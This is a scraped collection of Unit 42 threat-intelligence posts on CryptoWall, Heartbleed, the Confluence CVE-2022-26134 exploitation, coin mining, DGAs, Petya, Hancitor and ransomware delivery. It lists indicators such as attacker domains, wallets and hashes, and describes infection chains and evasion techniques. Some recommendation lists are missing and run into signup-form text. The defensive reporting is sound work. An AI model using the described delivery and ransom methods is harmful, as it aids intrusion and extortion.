These use four domains registered just today:
"All of the domains currently resolve to 151.248.115.146, a Russian IP address and have WhoIs records associated with the e-mail address “ladomfichisi1987@mail.ru”."
This is the same address used to register two other payment domains registered earlier this month:
"If these domains are confiscated or otherwise shut down, CryptoWall instructs the user to download the Tor Browser and access a website (paytordmbdekmizq.onion) that is only accessible over the Tor network. Unlikely some of it’s more flexible competition, CryptoWall only accepts ransom in the form of BitCoin."
To pay the ransom the user will need to acquire 1.33 BitCoins and transfer them to a specific BitCoin wallet that is associated with their specific infection.
"History has shown that paying the ransom will likely allow you to retrieve your files, but the best defense against ransomware is having up-to-date back-ups or by preventing the infection all-together."
"Since we detected the first CryptoWall 2.0 variant with our WildFire engine on September 29, we’ve seen over 85,000 separate attacks attempting to deliver the malware."
"The majority of these have come through e-mails with executable attachments, sometimes contained in .zip files."
"Most of the e-mail attacks used fake invoice, fax and voicemail themes with attachments named like the following:"
In the last week we’ve seen the attack vectors evolve to contain exploit kits as well.
"On October 19, the Kafeine posted a blog discussing the inclusion of CVE-2014-0556 in the Nuclear Pack exploit kit, which was installing CryptoWall 2.0."
Yesterday we picked up an e-mail campaign pretending to be a fax report that carried a .zip attachment with a PDF inside.
The PDF exploits CVE-2013-2729 to download a binary which also installed CryptoWall 2.0.
The best way to protect yourself against ransomware is to keep up-to-date backups of your important files.
"A ransomware infection, which encrypts all of your files, is similar to a drive failure, except that for a small fee you have the chance to get your files back."
"To protect against CryptoWall 2.0 we recommend taking the following actions: Adobe Reader Embedded BMP Parsing Integer Overflow Vulnerability CVE-2014-0556 Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"Yesterday, TrustedSec, a security consultancy based on Ohio, wrote that the recent breach at Community Health Systems (CHS) was the result of exploitation of the Heartbleed OpenSSL vulnerability (CVE-2014-0160)."
"CHS’s 8-K filing on Monday did not reveal how the attackers got into their network, only that the records of approximately 4.5 million patients were stolen in attacks in between April and June of 2014."
TrustedSec reports on how attackers were apparently able to glean user credentials from a certain device via the Heartbleed vulnerability and use them to log in via a VPN.
"We need more facts to be sure, but this instance may be the first public breach related to the Heartbleed vulnerability since it was announced in April."
"Now, over four months since the Heartbleed disclosure, this attack reminds us of how serious this vulnerability is and how critical protection against it remains."
"As Heartbleed allows the attacker to scrape memory from the vulnerable device, they can retrieve significant amounts of secret information."
"In this case, that apparently included VPN credentials, which they then used to log into the network and more laterally from system to system until discovering the data they were after."
While most vendors released patches for their products months ago it remains up to the users and administrators to ensure those patches are deployed.
"As the OpenSSL library is so widely used, some administrators may be finding unpatched systems for years to come."
"While network-based defenses are not a substitute for patching software, Heartbleed is detectable using IPS signatures."
"Palo Alto Networks deployed five signatures in April to defend against this threat, 40039, 36420, 36419, 36418 and 36416."
"No matter how well patched your systems are, there’s no reason not to deploy IPS signatures like these to detect and block attempted Heartbleed exploits."
"If you’ve already deployed signatures and your logs are showing attempted exploits, consider blocking or monitoring the IP addresses sending the requests."
"A Heartbleed probe could be evidence of the early stages of an attack on your network, and persistent attackers are unlikely to give up after jiggling the handle on the front door."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"This post is also available in: 日本語 (Japanese) On June 2, Volexity reported that over Memorial Day weekend, they identified suspicious activity on two internet-facing servers running Atlassian’s Confluence Server application."
"After analysis of the compromise, Volexity determined the initial foothold was the result of a remote code execution vulnerability in Confluence Server and Data Center."
"The details were reported to Atlassian on May 31, and Atlassian has since assigned the issue to CVE-2022-26134."
"Based on the security advisory issued by Atlassian, it appears that the exploit is indeed an unauthenticated, remote code execution vulnerability."
"If the vulnerability is exploited, threat actors could bypass authentication and run arbitrary code on unpatched systems."
"At the time of publication, the Palo Alto Networks attack surface management solution Cortex Xpanse identified 19,707 instances of Confluence Servers that are potentially affected by this CVE."
A patch resolving the issue has been posted by Atlassian.
Palo Alto Networks strongly advises organizations to patch immediately.
Updated June 7 to add additional in-the-wild observations.
Vulnerable Systems CVE-2022-26134 in the Wild Cortex Managed Threat Hunting Detections of CVE-2022-26134
Conclusion Indicators of Compromise
"The Palo Alto Networks attack surface management solution Cortex Xpanse found 19,707 instances of Confluence Servers that are potentially affected by this CVE."
"Additionally, the Xpanse research team also found 1,251 end-of-life versions of the Confluence Server exposed on the public internet."
Assets running end-of-life software should never be internet-facing.
"If an asset cannot be updated to secure versions of software, it should be isolated or decommissioned altogether."
"To learn more about the ubiquitous problem of end-of-life software, please refer to the 2022 Cortex Xpanse Attack Surface Threat Report."
"Thus far, Unit 42 has noted historical scans being performed by the IP addresses publicly shared by Volexity."
"These scans date back as early as May 26, 2022, and target organizations in various industries."
"Additionally, a purported proof of concept (PoC) has reached the public domain, increasing the threat this particular vulnerability poses."
The Cortex Managed Threat Hunting team has detected several exploitation attempts.
"Among the attempts, we found successful exploitation, which resulted in the Cerber Ransomware attack."
The ransomware was blocked by the Cortex XDR agent.
The Managed Threat Hunting team immediately reported this incident to the customer and continues to monitor our customers using the XQL queries in the following section.
Cortex XDR also includes multiple detections for post-exploitation activities.
Below are details of what was seen in the attempt.
"In this case, the process tomcat.exe spawned multiple reconnaissance commands such as: whoami, systeminfo, arp, ipconfig, etc. On top of that, a Base64-encoded PowerShell command was executed and retrieved a ransomware binary."
"In order to confirm the assumption that the above activity is related to CVE-2022-26134, we looked into the Confluence Apache access logs (atlassian-confluence.log) and found the PowerShell execution. The Cortex Managed Threat Hunting team continues to track any attempts to exploit CVE-2022-26134 across our customers, using Cortex XDR and the XQL queries below."
"Palo Alto Networks provides protection against the exploitation of this vulnerability in the following ways: Additionally, Xpanse has the ability to identify and detect Atlassian Confluence Servers that may be a part of your attack surface or the attack surface of third-party partners connected to your organization."
Xpanse is even able to classify those servers which have not been upgraded to the most recent version.
These abilities will be updated to detect additional instances or versions that are insecure against this CVE.
Existing Xpanse customers can log into Expander and identify their enumerated Atlassian Confluence devices by filtering by “Atlassian Confluence Server” in the Services tab.
"As further information emerges or additional detections and protections are put into place, Palo Alto Networks will update this publication accordingly."
"During the hunting process, we encountered exploitation attempts that originated from the following IP addresses: Updated June 13, 2022, at 5:30 a.m. PT."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
Overview
"As shoppers and retailers gear up for the 2017 holiday season, they need to be aware of a new kind of cybersecurity threat they may face this year: unauthorized coin mining."
Unauthorized coin mining is a new threat that can affect retailers and shoppers in a way that could impact or even halt their online shopping experience.
A recent Unit 42 threat intelligence posting on the topic showed how 63 percent of the unauthorized coin mining sites we found came online in October 2017.
"This surge in unauthorized coin mining is driven, in large part, by the recent skyrocketing in the value of digital currencies like bitcoin."
"As that trend shows no sign of slowing down anytime soon, we can expect this to remain a very lucrative avenue for attackers."
"Unlike other cybersecurity threats we’re used to bracing for around the holiday season, unauthorized coin mining attacks can affect shoppers who are up-to-date with security patches and even some running some security protections."
"And unlike spam or phishing, these attacks also don’t require any lapse in vigilance by the user: they can happen simply by going to websites users know and trust."
The good news for retailers is that these attacks are wholly preventable.
"And for shoppers, the impact of a successful attack is minimal: there are no lasting effects or impact, making it an annoyance at worst. But because of the potential impact on holiday shopping and the ease of attacks, unauthorized coin mining is an attack that retailers need to be aware of and take active steps for prevention this holiday season."
What Is Unauthorized Coin Mining?
The best way to understand the threat of unauthorized coin mining is to first understand its impact.
"Unauthorized coin mining is an attack that can cause a user’s system to suddenly and unexpectedly slow down, sometimes significantly, when visiting a website."
"In a worst case, the slow-down can be so severe that it can make a website basically unusable."
"Obviously, this impact is potentially dire for shoppers and retailers as it directly impacts and harms the online shopping experience."
What causes this impact is when the website the user visits is running “coin miner” code.
“Coin miner” code is code used to “mine” for digital currency like bitcoin.
Mining provides the computing necessary to power the digital currency’s infrastructure.
"Mining is also a computationally intensive process, meaning it takes a lot of system resources."
"Because of this, people can earn digital currency credit in exchange for the use of their computing resources to power that digital currency’s infrastructure."
There are many kinds of coin mining software.
"In this case, we are concerned about coin mining code that’s used on websites."
"When the user visits the website, the code runs on their system and “mines” on behalf of others – either the website or someone else."
"When this is done with the visitor’s full knowledge and consent, it’s a fair and reasonable exchange."
"For instance, there are some websites that now use coin mining as an alternative to digital advertising to generate revenue."
"In these cases, the coin mining is authorized; the website informs the user that, while on the site, his or her computing resources will be used to “mine” digital currency, and the site will receive the credits."
"While the user will experience a slow-down as the coin mining software is run, it is (or should be) expected, because of the notification, and so done with the site visitor’s consent."
Where this becomes a problem is when coin mining is done without the user’s knowledge and consent.
"In this case the coin mining is unauthorized: in essence, it’s an attack against the user’s resources."
How Do Unauthorized Coin Mining Attacks Happen?
Unauthorized coin mining attacks happen very simply: the website the user is visiting has special code on it that performs coin mining operations on the visitor’s computer while they’re on the website.
"And, as noted before, this happens without the user’s knowledge or consent."
"Because these attacks happen due to code on the website, that code is either there with the site owner’s knowledge and permission or not."
"When unauthorized coin mining happens with the site owner’s knowledge and permission, it’s basically a malicious site."
That site’s owner is the attacker.
"When we’re talking about online shopping, clearly there’s no threat here to the retailer: they’re the ones doing the attacking."
"And for the shopper, it means you’re on an untrustworthy site and so open to all manner of risks beyond just unauthorized coin mining."
"The real, significant situation shoppers and retailers need to think about this season is when unauthorized coin mining code is on a site without that site owner’s knowledge and permission."
"Here the site itself has been attacked, and the site owners are also victims."
This is an attack against not just shoppers but the retailers operating online shopping sites.
"How You Can Prevent Unauthorized Coin Mining Attacks If you’re a shopper, there are three things you can do to protect yourself against unauthorized coin mining attacks this holiday season: If you’re a retailer, preventing unauthorized coin mining attacks comes down to focusing on two tasks, both of which you should be doing anyway: Finally, if you’re a legitimate website that has chosen to implement coin mining to raise funds from your visitors, you can ensure that your visitors don’t think you’re engaged in unauthorized coin mining by doing three things: Conclusion Working to prevent cybercrime threats during the holiday season has become a standard part of what shoppers and retailers do every year."
"This year, for the first time in many years, shoppers and retailers are facing a new threat, unauthorized coin mining, driven by the surge in digital currency prices."
"While this threat can have a clear, negative impact on retailers and shoppers, the good news is that this threat is easily preventable and poses no lasting harm to consumers."
"This is a case where forewarned is forearmed, and that forearming can result in effective prevention. Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
This post is also available in: 日本語 (Japanese) Intro
One of the most important “innovations” in malware in the past decade is what’s called a Domain Generation Algorithm (“DGA”)”.
DGA is an automation technique that attackers use to make it harder for defenders to protect against attacks.
"While DGA has been in use for over 10 years now, it’s still a potent technique that has been a particular challenge for defenders to counter."
"Fortunately, there are emerging technologies now that can better counter DGAs."
What is it?
A Domain Generation Algorithm is a program that is designed to generate domain names in a particular fashion.
Attackers developed DGAs so that malware can quickly generate a list of domains that it can use for the sites that give it instructions and receive information from the malware (usually referred to as “command and control” or C2).
Attackers use DGA so that they can quickly switch the domains that they’re using for the malware attacks.
Attackers do this because security software and vendors act quickly to block and take down malicious domains that malware uses.
Attackers developed DGA specifically to counter these actions.
"In the past, attackers would maintain a static list of malicious domains; defenders could easily take that list and start blocking and taking down those sites."
"By using an algorithm to build the list of domains, the attackers also make it harder for defenders to know or predict what domains will be used than if they had a simple list of domains."
"To get that list of domains that the malware will use, defenders have to decode the algorithm which can be difficult."
"Even then, taking down sites that malware using a DGA can be a challenge as defenders have to go through the process of working with ISPs to take down these malicious domains one by one."
Many DGAs are built to use hundreds or even thousands of domains.
And these domains are often up for only limited periods of time.
In this environment blocking and taking down DGA-related domains quickly becomes a game of “whack a mole” that is sometimes futile.
"Why should I care, what can it do to me?"
DGA by itself can’t harm you.
But it is an important piece that enables modern malware to try and evade security products and countermeasures.
The importance and usefulness of DGA is best shown by the fact that it’s been in regular and constant use since at least 2008.
DGA was a key component in the Conficker attacks in 2008 and 2009 and part of its success.
What can I do about it?
"Because DGA is a technique the fuels malware attacks, the things you can do to help prevent malware can also help prevent DGA-fueled malware attacks: In addition, new technologies are being developed that can more directly counter DGA-fueled attacks, particularly for organizations."
"In particular, security vendors are bringing automation to bear to counter the attackers’ automation."
"New anti-DGA technologies that leverage machine learning and big data are capable of countering DGA’s automation with automated prediction of their own that can anticipate, block, assist with malicious site takedowns or even, in some cases, prevent those malicious sites from being used in the first place."
You can also learn more about these new technologies and look at deploying them as an additional layer of protection.
About: Threat Briefs are meant to help busy people understand real-world threats and how they can prevent them in their lives.
"They’re put together by Palo Alto Networks Unit 42 threat research team and are meant for you to read and share with your family, friends, and coworkers so you can all be safer and get on with the business of your digital life. Got a topic you want us to write about for you, your friends, or your family?"
Email us at u42comms@paloaltonetworks.com.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
Unit 42 released details about a vulnerability that affects Android devices running operating systems older than 8.0 Oreo.
The vulnerability leaves Android users at risk of falling victim to an Android Toast Overlay attack.
"Patches are available that fix this vulnerability, so Android users should get the latest updates as soon as possible."
How it Works
"The vulnerability affects the Toast feature on Android devices, an Android feature that allows display messages and notifications of other applications to “pop up,” and allows an attacker to employ an overlay attack."
An overlay attack happens when an attacker places a window over a legitimate application on the device.
"Users will interact with the window, thinking they are performing their intended function, but they are actually engaging with the attackers overlay window and executing the attacker’s desired function."
You can see an example of how this would work in Figure 1.
"Figure 1: Bogus patch installer overlying malware requesting administrative permissions This interaction can install malware or malicious software on the device, grant malware full administrative privileges or lock the user out and render the device unusable. In the past successful overlay attacks were typically dependent on two conditions: However, with this particular vulnerability, these conditions are no longer required for a successful attack."
This means that attackers can use this vulnerability in apps users get from places other than Google Play.
"And when they install these malicious apps, they don’t have to ask for the “draw on top” permission."
How to Defend Against It Keeping devices updated is a general security best practice.
The Android Toast Overlay attack specifically targets outdated devices using versions prior to 8.0.
"In order to defend against the Android Toast Overlay attack, update all Android devices to the latest version."
"Additionally, avoid downloading malicious applications by only downloading from the Google Play store is another best practice you should always follow."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
This post is also available in: 日本語 (Japanese) Ransomware is one of the top threats in cybersecurity and a focus area for Palo Alto Networks.
"In the current threat landscape, ransom payments are rising and organizations are seeking to protect themselves from threat actors."
"In the 2021 Unit 42 Ransomware Threat Report, we detailed the observations and the trend of top ransomware families from January 2020-January 2021."
"This post supplements that information based on observations from the first three months of 2021, and will discuss the propagation of different ransomware families we observed in the wild and the different types of extortion used."
We hope the information will help readers get a clear picture of current directions in ransomware trends.
"In the first quarter (Q1) of 2021, Unit 42 detected 113 different ransomware families in the wild."
"Based on the statistical data, the top 15 ransomware families only cover 52.3% of total ransomware cases."
This demonstrates the diversity of ransomware and emphasizes how difficult it is to expand ransomware detection coverage with static profiling.
Figure 1 shows the proportion of ransomware sample numbers for different families that Unit 42 detected in the wild.
"Among all, 6.7% of the ransomware samples are Virlock, which has been active since 2014."
Virlock has the largest number of variants due to its file-infector-like behavior.
Higher malware variant numbers don't necessarily imply a higher prevalence.
"Some ransomware families don’t deliver different variants every time, but the infection ratio per sample is high, meaning attackers delivered the same malware to huge numbers of victims."
Figure 2 shows a completely different result from Figure 1 and stems from only counting ransomware samples from cases in which more than five hosts were infected with the same malware.
"From this lens, the top three families observed are Ryuk (31.7%), Sodinokibi (20%) and Maze (15%). Emails are still the most efficient method to deliver and propagate ransomware."
Figure 3 shows ransomware arrives via different application protocols.
The majority of ransomware is delivered by email.
Web browsing is the second most common entry vector for ransomware infections.
The process of delivering malware by a URL can include various techniques.
"For example, the URL links can be posted on forums or chat group software, sent by IM applications, offered via fake freeware for download or attached in emails."
Web hosting ransomware can also be downloaded and successfully installed through a multi-layered infection chain among different file types.
"For example, AlumniLocker is first delivered as a phishing PDF."
It leads to downloading a ZIP archive that contains an LNK downloader.
This downloads and executes an obfuscated PowerShell script to finally install the ransomware.
Figure 4 breaks down which file types we saw in the course of ransomware detection and their prevalence.
32-bit EXE is the most common ransomware file type we observed.
"Other file types are often used as the first stage of infection or downloaders, such as archives, documents and scripts."
Most ransomware is delivered via email with an attached archive; the ransomware is compressed in the archived files with or without password protection.
"“Resume” or “portfolio document” are examples of archive file names, and the archive contains one or more pieces of malware with fake document file icons."
"One example here is Makop, contained in a 7z archive along with an infostealer malware (SHA256: DE6DFA018773E07C218EF1DF62CE0D99A708841BF1DDFB4C6AD7E323D5D666A4)."
A script file is also used to download or install ransomware.
"For example, GandCrab uses JScript as a downloader, leveraging Windows Background Intelligent Transfer Service (BITS) to download the payload in the background (Figure 5)."
We also observed that Mailto (AKA NetWalker) tends to deliver ransomware in a highly obfuscated PowerShell script.
Exploit documents are seldom seen for delivering ransomware.
One example is an exploit RTF that led to downloading and installing Makop ransomware remotely.
"Besides encrypting files on infected hosts, the main feature of ransomware is, of course, the demand for ransom."
"Since ransomware threat actors have had years to evolve their techniques, there are now several different ways for attackers to receive payments and provide the ""service"" they claim to offer."
"Usually, after the ransomware successfully installs, it pops up a message box or leaves text files to explain how to pay the ransom – the ransom note."
Some ransomware locks the victim's screen and only displays the ransom note.
Unit 42 has reviewed ransom notes from different ransomware families.
"Most ransom notes request payment in cryptocurrency or mention reaching out via the darknet, though some other contact methods also appear. In these cases, the ransom note asks victims to pay a specific amount in cryptocurrency – Bitcoin (BTC), Monero (XMR), etc. — to a specific wallet address."
Two ransomware families that utilize these types of ransom notes are Virlock and WanaCrypt0r.
"Some ransomware families, including Babuk, Sodinokibi, Cerber, Mailto, Ryuk and others, seldom show the ransom amount or cryptocurrency wallet address."
"Instead, they instruct victims to install TOR and reach out to them on the darknet."
"Usually, they host a website for victims to input the identification key found in the ransom note, upload encrypted files for decryption – and pay the ransom."
"Ransom notes from Makop, Dharma, Ryuk, DearCry and others, sometimes ask victims to reach out to them via email."
The email addresses given are usually from untraceable email accounts.
"At other times, a threat actor lets the victim chat with them directly on group chat software."
The victims can find the threat actor’s user name through specific group chat software or follow a chat group link in the ransom note. Ransom payment operations are complicated and highly automated processes.
Attackers can create a lot of cryptocurrency wallets automatically; they can even make a unique wallet address for each victim.
"Once a ransom is received, the ransom will be involved in the multiple transactions that are managed to distribute and aggregate the ransom across thousands of virtual wallets."
"For example, the Xorist ransomware (SHA256: 4979A10B81C41ECC0FC3A0F376ADE766CE616D2301639F74E0277047CC40E3D6) demanded £1,000 for a ransom; the bitcoin wallet address was 1BFqrLCDwwrxueY7FFDn8DqeoasPJignxt."
"However, this wallet had not really received any ransom payments when the malware was delivered."
The wallet got involved in the operation of mixing and tumbling among several other virtual wallets.
This is a pretty common operation when attackers want to withdraw or disperse currency from ransom payments into other wallets.
"During the operation, 25.1 BTC from 538 wallets was sent to 1NDyJtNTjmwk5xPNhjgAMu4HDHigtobu1s (SHA256: CE11703DEF517306326C48A67A7C859A3DE0F18E2451DF226CE171389A5B7953), which is a wallet owned by Binance cryptocurrency exchange."
(ref: Binance on Twitter ).
"The 25.1 BTC amount was worth $1.18 million at that time, and now is about $876,000."
"Since Virlock only requests a $250 ransom, it does not draw too much public attention."
"Other ransomware families, however, target enterprises and ask for multimillion dollar ransoms, which garners much more media attention."
"Based on the way Virlock spreads the ransom amount it demands, it is likely designed to target consumers or home users."
"After infection, Virlock hides the file extension through modification of the registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt = 1, HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden = 2)."
"The encrypted file icon will look the same as usual, but after opening the infected file, the ransom note will pop up."
"Virlock uses, but isn’t limited to, PDF, DOC, PPT, JPG, BMP,GIF, RAR, 7Zip, Zip and EXE files."
Figure 6 is a screenshot of a recently captured Virlock ransom note.
"The attacker asked for $250 and required payment as 0.004 BTC (suggesting that at the time the ransom note was written, 1 BTC equaled approximately $62,500)."
"At the time of infection experiments, 1 BTC equaled approximately $54,649, suggesting that the exchange rate in the ransom note is not updated on the fly."
"Some Virlock variants ask for more ransom, such as 0.771 BTC, 1.008 BTC or more."
"The top three samples we observed spreading in early 2021 were Ryuk, Maze, and Sodinokibi."
These three contribute 7.2% out of the total infected numbers we collected.
"Ryuk will change the infected file extension to .RYK, and leave a ransom note called RyukReadMe.html."
One of the reasons Ryuk causes so much damage is because it will scan the local network and try to infect other machines through Server Message Block (SMB) protocols.
Ryuk will even send out Wake-on-LAN packets to wake up systems that have been configured with this feature.
"In this research, we discussed ransomware family trends we observed in the first three months of 2021."
"First, we reviewed the trends from prevalent ransomware families, then we discussed the most common file types used as attack vectors leveraged by ransomware."
"Lastly, we gave an example of ransom operations and updates about top ransomware families."
Ransomware threats are a serious challenge.
Employing effective backup strategies and disaster recovery procedures is important.
Palo Alto Networks customers are further protected from ransomware.
"Cortex XSOAR can automatically and instantly coordinate with network security, malware analysis and threat management solutions to ensure customers remain protected."
"Cortex XDR endpoint protection stops malware, exploits and ransomware before they can compromise endpoints."
"With AI-powered Inline analysis, the Next-Generation Firewall stops exploits that lead to infection, and WildFire’s always up-to-date machine learning models monitor behavior to preemptively detect unknown ransomware."
"If you think you may have been impacted by ransomware, please email unit42-investigations@paloaltonetworks.com or call (866) 4-UNIT42 to get in touch with the Unit 42 Incident Response team."
"Highlights from the 2021 Unit 42 Ransomware Threat Report Ransomware Threat Assessments: A Companion to the 2021 Unit 42 Ransomware Threat Report Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"If you need to understand one thing about cybercrime, it’s that it is all about business."
"In our latest Unit 42 research on cybercriminals using the Hancitor malware, we show that not only are their attacks about business, we can see these cybercriminals deftly applying some fundamental business principles around timing, specialization, and globalization."
Hancitor is a malware that focuses getting other malware onto the victim’s system.
"In the case of Hancitor, it’s typically banking Trojans that steal the victim’s banking information."
"In our latest research, we can see the attackers behind Hancitor have been timing their attacks to happen during the busiest time of the global working week, the middle of the week."
"And we’ve seen that in adapting their attacks to better evade detection, they’ve specialized their operations around the globe."
Hancitor isn’t particularly advanced in its tactics: it’s ideal target is an old or outdated version of Microsoft Windows like Windows 7 or even Windows XP.
But it’s effective enough that when used in several hundred different spam campaigns every month it pays for the criminals to keep up these attacks against targets around the world.
"Timing In our most recent research, one of the things that jumped out for our researchers is the clear pattern around the timing of the attacks."
"As you can see in Figure 1 below, throughout 2017, the Hancitor attacks show clear spikes in their occurrence and these spikes happen during the middle of the week."
Figure 1: Timeline of Hancitor campaign activity since January 2017.
"The attackers behind Hancitor aren’t the first to time their spam attacks like this, but it is an effective tactic to try and increase their chances of success, especially when combined with the other innovation that we’ve seen."
Adapting the Attacks
"In the past, Hancitor was sent as a malicious attachment in a spam email which would then download and install the attackers’ final malware like a banking Trojan."
"When they would do this, the Hancitor attachment would download and install the final malware from a malicious or compromised site."
"But as organizations have gotten more effective at blocking malicious attachments like Hancitor, we’ve seen the attackers behind Hancitor adapt to evade detection and prevention."
They’ve done this by moving the Hancitor malware from being a malicious attachment in spam to itself being a malicious download.
The spam the attackers use no long has a malicious attachment but instead a malicious link that downloads the malicious Hancitor attachment.
"To do this, they make the spam look like something that requires you to click and download something like and invoice, a message, or a delivery notification."
Figure 2 shows one of these that was made to look like an Amazon shipping notice.
Figure 2: Hancitor malspam example from February 2017.
This means that a Hancitor attack now has two downloads rather than one and what these attackers did around the malicious downloads shows another modern business tactic: globalization.
Globalizing the Attacks Figure 3 below is a map showing where our Unit 42 researchers have found webistes involved in Hancitor attacks.
Figure 3: Hancitor distribution servers globally thus far in 2017 Table 1 – Number of Distribution Servers by Country
The hot spots in the United States represents distribution servers which are created using fraud based accounts at various hosting providers that are hosting the Hancitor documents while the hotspots in Asia represent legitimate sites for small and medium businesses that have been compromised by the actors behind Hancitor campaign to host the malicious Hancitor documents.
Conclusion Attackers are always making business decisions to optimize their attacks in ways that are most successful and profitable.
What is most interesting about Hancitor is the way these decisions so clearly reflect an awareness of business realities (by targeting peak working times) and dividing up the “work” of their attacks in a way that so clearly mirrors mainstream business decisions around globalizing operations.
"In the end, while Hancitor may not be sophisticated, these steps to adapt and stay effective seem to be succeeding."
And we expect to continue to see Hancitor be a global threat for the foreseeable future.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"This post is also available in: 日本語 (Japanese) This Unit 42 blog provides an update on the threat situation surrounding attacks using the Petya Ransomware which are impacting organizations in Ukraine, Russia and to a lesser extent around the world."
"On June 27th, 2017 we became aware of a new variant of the Petya malware which is spreading through multiple lateral movement techniques."
One technique includes the ETERNALBLUE exploit tool.
"This is the same exploit the WanaCrypt0r/WannaCry malware exploited to spread globally in May, 2017."
"At least 50 organizations have reported impacts from the malware, including government and critical infrastructure operators."
Palo Alto Networks is documenting our prevention capabilities with regard to this threat in the Palo Alto Networks Protections for Petya Ransomware blog post.
Windows users should take the following general steps to protect themselves:
"This is a developing situation, we will update this blog as new information becomes available."
AutoFocus users view samples using the Petya tag.
"Petya is a ransomware family that works by modifying the Window’s system’s Master Boot Record (MBR), causing the system to crash."
"When the user reboots their PC, the modified MBR prevents Windows from loading and displays a fake “chkdisk” screen which indicates the computer's hard drive is being repaired, but the malware is actually encrypting the user's files."
"When this process completes, the malware displays an ASCII Ransom note demanding payment from the victim (Figure 1). Figure 1: Latest Petya Ransom note displayed on a compromised system."
"The latest version of the Petya ransomware is spreading over Windows SMB and is reportedly using the ETERNALBLUE exploit tool, which exploits CVE-2017-0144 and was originally released by the Shadow Brokers group in April 2017."
After the system is compromised the victim is asked to send US $300 in Bitcoin to a specific Bitcoin address and then send an e-mail with the victim’s bitcoin wallet ID to wowsmith123456@posteo[.]net to retrieve their individual decryption key.
"Posteo (a free e-mail provider) has already shut down this e-mail address, and as such victims should not even attempt to pay the ransom."
"As of 13:00 UTC on June 28thth, approximately 4 Bitcoin have been transferred to the attacker's wallet."
Unit 42 is unaware of ANY successful recovery after paying the ransom.
"Additionally, ongoing research by the industry is showing that specific actions this malware takes makes it technically infeasible, if not impossible, for recovery to occur."
"This means that even though this malware is functionally ransomware, for threat assessment purposes, it should be functionally considered a “wiper”."
We are aware of the following information about how the Petya attack lifecycle works.
Delivery/Exploitation
We have not yet confirmed the initial infection vector for this new Petya variant.
"Previous variants were spread through e-mail, but we have not identified this latest sample carried in any e-mail related attacks."
"While we have not been able to directly confirm the source, we have seen evidence that a Ukrainian software application called MEDoc was used by attackers to deliver the Petya DLL."
The software is heavily used in Ukraine it appears the company’s systems may have been compromised and used to issue a malicious update to systems running the program on the morning of Jun 27th.
Installation
"This variant of Petya is spread as a DLL file, which must be executed by another process before it takes action on the system."
"Once executed, it overwrites the Master Boot Record and creates a scheduled task to reboot the system."
"Once the system reboots, the malware displays a fake “chkdisk” scan which tricks the victim into believing the program is repairing their hard drive."
"In reality, the malware is encrypting the NTFS Master File Table in the background."
"Once the fake chkdisk completes, the malware displays a ransom note which demands a payment of $300 in bitcoin."
Command and Control Petya contains no Command and Control mechanisms that we know of.
"After a host is infected, there is no communication from the malware back to the attacker."
Lateral Movement Petya uses three mechanisms to spread to additional hosts.
"Ransomware attacks are very common, but they are rarely coupled with an exploit that allows the malware to spread as a network worm."
"The WannaCry attacks in May, 2017 demonstrated that many Windows systems had not been patched for this vulnerability."
"The spread of Petya using this vulnerability indicates that many organizations may still be vulnerable, despite the attention WannaCry received."
"As always if you have any questions, please come to the Threat & Vulnerability Discussions on our Live Community. Version Summary June 27, 2017: June 27, 2017 – 1:08 PM PT June 28, 2017 – 8:40 AM PT June 29, 2017 - 5:00 PM PT Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
Nearly all of us have a use for Microsoft Office documents.
"Whether they are work documents, e-receipts, or a lease on a new apartment – Office documents are useful to all of us, and this is part of the reason we’re very likely to open an office document we receive as an attachment in e-mail."
"Armed with the knowledge that many people will open nearly any document, even those from an untrusted source, adversaries commonly choose these files in attacks to compromise a system."
"In this threat brief we show you five different ways that Office documents can be subverted and abused to attack and compromise a Windows endpoint, some we’ve already posted about before, and some are new."
Macros Macros are the most straight-forward way for an attacker to weaponize Office documents.
Office applications have a built-in script engine that can run VBA (Visual Basic for Applications) scripts.
"These scripts can execute immediately as the document opens, without any user interaction (assuming the user has previously enabled macros) and run malicious code on the system."
"If the user has not enabled macros, a popup window will appear asking the user to click to do so."
The pop-up is one of several security mechanisms added by Microsoft to mitigate the security risk that macros pose.
Microsoft will also force a different file extension (.docm instead of .docx for new documents containing macros).
"Despite these measures, users still choose to open these files and enable their content, thus allowing macros to continue be a common attack vector – both in wide and simple attacks to deliver ransomware such as Emotet, as well as for sophisticated attacks like this Sofacy campaign."
Figure 1.
The Sofacy document before & after the content is enabled
"As you can see in this example, attackers try to convince users to disable the security mechanisms added by Microsoft using social engineering, convincing the user to enable content for them to be able to see the full document."
"In the Sofacy example, the attackers had simply made the font color white, so the text was present prior to the user enabling macros, just not clearly visible."
"Embedded Flash files In addition to built-in capabilities, like macros, Office documents can also be embedded with external objects, such as Adobe Flash files."
"These objects are passed to the appropriate software for handling, thus any vulnerability that the software has can also be exploited by embedding it within the Adobe Flash content in the Office document."
"An example for such attack vector being leveraged by attackers is CVE-2018-4878, an Adobe Flash Player Zero-Day exploited by embedding malicious SWF files in Excel documents."
